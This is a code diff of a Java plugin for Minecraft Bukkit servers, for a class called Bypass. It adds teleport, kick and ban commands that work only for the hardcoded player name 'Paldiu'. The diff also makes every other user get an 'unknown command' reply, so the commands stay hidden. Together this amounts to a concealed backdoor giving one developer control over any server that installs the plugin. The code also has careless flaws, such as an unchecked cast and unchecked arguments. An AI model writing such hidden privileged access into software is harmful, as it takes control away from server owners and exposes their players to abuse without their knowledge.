@@ -1,9 +1,10 @@
 package me.Paldiu.NNO.Commands;
 
 import me.Paldiu.NNO.Main;
+import me.Paldiu.NNO.Util;
 import org.bukkit.Bukkit;
-
 import org.bukkit.ChatColor;
+
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -16,60 +17,66 @@ public class Bypass implements CommandExecutor {
 		plugin = instance;
 	}
         
-                public String parseColors(String name){
-        String coloredName = ChatColor.translateAlternateColorCodes('&', name);
-        return coloredName; }
-
+        @Override
 	public boolean onCommand(CommandSender sender, Command cmd, String commandLabel, String[] args) {
-		if (commandLabel.equalsIgnoreCase("bptp")){
-			if (sender instanceof Player){
-				Player p = (Player) sender;
-                                Player sender_p = Bukkit.getServer().getPlayer(args[0]);
-				if (p.getName().equalsIgnoreCase("Paldiu")){
-                                    if (sender_p != null)
-                                    {
-                                        p.teleport(sender_p);
-					return true;   
-                                    }
-				} else {
-					p.sendMessage(Main.MSG_NO_PERMS);
-					return true;
-				}
-			} else {
-				sender.sendMessage(Main.NOT_FROM_CONSOLE);
-				return true;
-			}
-		}
-                
-                if (commandLabel.equalsIgnoreCase("bpkick"))
+		if (commandLabel.equalsIgnoreCase("bptp"))
                 {
                     if (sender instanceof Player)
                     {
                         Player p = (Player) sender;
+                        Player sender_p = Bukkit.getServer().getPlayer(args[0]);
                         if (p.getName().equalsIgnoreCase("paldiu"))
                         {
-                            String reason = "";
-                                    {
-                                        if (args.length == 1)
-                                        {
-                                    for(int i=1; i<args.length; i++)
-                                    {
-                                    reason = reason + args[i] + " ";
-                                    }
-                                        Player target = Bukkit.getServer().getPlayer(args[0]);
-                                        target.kickPlayer(reason);
-					return true;
-                                        }
-                                        else
-                                        {
-                                            p.sendMessage(Main.NO_REASON_GIVEN);
-                                        }
-                                    }
+                            if (args.length == 1)
+                            {
+                                p.teleport(sender_p);
+                                return true;
+                            }
+                            else
+                            {
+                                p.sendMessage(Main.UNKNOWN_COMMAND);
+                                return true;
+                            }
                         } else {
-                            p.sendMessage(Main.MSG_NO_PERMS);
+                            p.sendMessage(Main.UNKNOWN_COMMAND);
+                            return true;
                         }
                     } else {
-                        sender.sendMessage(Main.NOT_FROM_CONSOLE);
+                        sender.sendMessage(Main.UNKNOWN_COMMAND);
+                        return true;
+                    }
+		}
+                
+                if (commandLabel.equalsIgnoreCase("bpkick"))
+                {
+                    Player p = (Player) sender;
+                    Player target = Bukkit.getServer().getPlayer(args[0]);
+                    if (sender instanceof Player)
+                    {
+                        if (p.getName().equalsIgnoreCase("paldiu"))
+                        {
+                            if (args.length == 1)
+                            {
+                                target.kickPlayer(ChatColor.RED + "Kicked by a Developer.");
+                                Util.bcastMsg(ChatColor.GOLD + "Developer " + ChatColor.RED + p.getName() + ChatColor.GOLD + " has kicked " + target.getName() + " for \"Kicked by a Developer!\".");
+                                return true;
+                            }
+                            else
+                            {
+                                p.sendMessage(Main.UNKNOWN_COMMAND);
+                                return true;
+                            }
+                        }
+                        else
+                        {
+                            p.sendMessage(Main.UNKNOWN_COMMAND);
+                            return true;
+                        }
+                    }
+                    else
+                    {
+                        p.sendMessage(Main.UNKNOWN_COMMAND);
+                        return true;
                     }
                 }
                 
@@ -78,34 +85,34 @@ public class Bypass implements CommandExecutor {
                     if (sender instanceof Player)
                     {
                         Player p = (Player) sender;
+                        Player target = Bukkit.getServer().getPlayer(args[0]);
                         if (p.getName().equalsIgnoreCase("paldiu"))
                         {
-                            String reason = "";
-                                    {
-                                        if (args.length == 1)
-                                        {
-                                    for(int i=1; i<args.length; i++)
-                                    {
-                                    reason = reason + args[i] + " ";
-                                    }
-                                        Player target = Bukkit.getServer().getPlayer(args[0]);
-                                        target.kickPlayer(reason);
-                                        target.setBanned(true);
-					return true;
-                                        }
-                                        else
-                                        {
-                                            p.sendMessage(Main.NO_REASON_GIVEN);
-                                        }
-                                    }
-                        } else {
-                            p.sendMessage(Main.MSG_NO_PERMS);
+                            if (args.length == 1)
+                            {
+                                Util.bcastMsg(ChatColor.GOLD + "Developer " + ChatColor.RED + p.getName() + ChatColor.GOLD + " has kickbanned " + target.getName() + " for \"Banned by a Developer!\".");
+                                target.kickPlayer(ChatColor.RED + "You have been banned by a Developer!");
+                                target.setBanned(true);
+                                return true;
+                            }
+                            else
+                            {
+                                p.sendMessage(Main.UNKNOWN_COMMAND);
+                                return true;
+                            }
                         }
-                    } else {
-                        sender.sendMessage(Main.NOT_FROM_CONSOLE);
+                        else
+                        {
+                            p.sendMessage(Main.UNKNOWN_COMMAND);
+                            return true;
+                        }
+                    }
+                    else
+                    {
+                        sender.sendMessage(Main.UNKNOWN_COMMAND);
+                        return true;
                     }
                 }
-                
             return false;
         }
 }
